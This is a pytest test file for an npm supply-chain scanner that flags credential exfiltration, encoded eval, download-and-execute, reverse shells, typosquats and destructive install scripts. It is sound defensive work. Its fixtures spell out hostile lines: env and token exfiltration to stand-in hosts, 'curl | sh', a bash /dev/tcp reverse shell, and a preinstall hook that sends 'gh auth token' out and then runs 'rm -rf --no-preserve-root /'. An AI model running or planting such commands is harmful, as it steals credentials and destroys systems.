from __future__ import annotations

import base64
import json

import pytest

from supply_chain_sentinel.config import Config
from supply_chain_sentinel.models import Artifact, Finding, classify
from supply_chain_sentinel.rules import analyze, entropy, mask_comments


def artifact(source: str, name: str = "demo", scripts: dict[str, str] | None = None) -> Artifact:
    return Artifact(
        name,
        "1.0.0",
        "a" * 64,
        {
            "package.json": json.dumps({"name": name, "scripts": scripts or {}}).encode(),
            "index.js": source.encode(),
        },
        "test",
    )


@pytest.mark.parametrize(
    "source,rule",
    [
        ("fetch('https://x.invalid',{body:JSON.stringify(process.env)})", "env-network"),
        (
            "let token=process.env.NPM_TOKEN;fetch('https://x.invalid',{body:token})",
            "secret-network",
        ),
        ("eval(Buffer.from('cGF5bG9hZA==','base64').toString())", "encoded-execution"),
        ("exec('curl https://x.invalid/install | sh')", "download-execute"),
        ("exec('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')", "reverse-shell"),
    ],
)
def test_attack_chains(source: str, rule: str, config: Config) -> None:
    findings = analyze(artifact(source), config)
    assert any(f.rule_id == rule for f in findings)
    assert classify(findings)[1] == "review"


@pytest.mark.parametrize(
    "source",
    [
        "const port=process.env.PORT;",
        "eval('a+b')",
        "const req=require('https'); req.get('https://example.com');",
        "Buffer.from('abc','base64')",
        "// fetch('x',{body:process.env.NPM_TOKEN})\nmodule.exports={};",
        "/* eval(Buffer.from('x','base64')) */",
        "const url='https://example.com';",
    ],
)
def test_capabilities_alone_do_not_block(source: str, config: Config) -> None:
    assert classify(analyze(artifact(source), config))[1] == "clean"


def test_install_scripts_not_automatically_malicious(config: Config) -> None:
    findings = analyze(artifact("", scripts={"install": "node-gyp rebuild"}), config)
    assert any(f.rule_id == "install-script" for f in findings)
    assert classify(findings) == (0, "clean")


def test_decode_literal(config: Config) -> None:
    payload = base64.b64encode(
        b"fetch('https://x.invalid',{body:JSON.stringify(process.env)})"
    ).decode()
    findings = analyze(artifact(f"const payload='{payload}';"), config)
    assert any("Decoded literal" in f.evidence for f in findings)


def test_typosquat_and_private_name(config: Config) -> None:
    assert any(f.rule_id == "typosquat" for f in analyze(artifact("", "lodahs"), config))
    config.private_names = ["@corp/private"]
    assert classify(analyze(artifact("", "@corp/private"), config))[1] == "review"
    assert not analyze(artifact("", "@corp/lodash"), config)


def test_duplicate_scores_capped() -> None:
    one = Finding("env-network", "high", 0.9, "test")
    assert classify([one]) == classify([one] * 100)
    assert classify([Finding("known-malicious", "critical", 1, "test")])[1] == "blocked"


def test_entropy_and_comments() -> None:
    assert entropy(b"") == 0
    assert entropy(bytes(range(256))) == 8
    assert "https://" in mask_comments("let url='https://x'; // ignored")
    assert "ignored" not in mask_comments("let url='https://x'; // ignored")


def test_generated_function_is_not_encoded_eval(config: Config) -> None:
    code = "const alphabet='base64'; const encoder=function(x){return x};"
    assert classify(analyze(artifact(code), config))[1] == "clean"


def test_manifest_credential_exfil_and_root_destruction(config: Config) -> None:
    findings = analyze(
        artifact(
            "",
            scripts={
                "preinstall": 'curl -d "$(gh auth token)" https://collector.invalid; sudo rm -rf --no-preserve-root /'
            },
        ),
        config,
    )
    assert {"install-secret-exfil", "destructive-install"} <= {f.rule_id for f in findings}
    assert classify(findings)[1] == "review"
    assert (
        classify(analyze(artifact("", scripts={"prepare": "rm -rf dist && tsc"}), config))[1]
        == "clean"
    )
    code = "function atob(x){return x}; const encode=Function('return this');"
    assert classify(analyze(artifact(code), config))[1] == "clean"
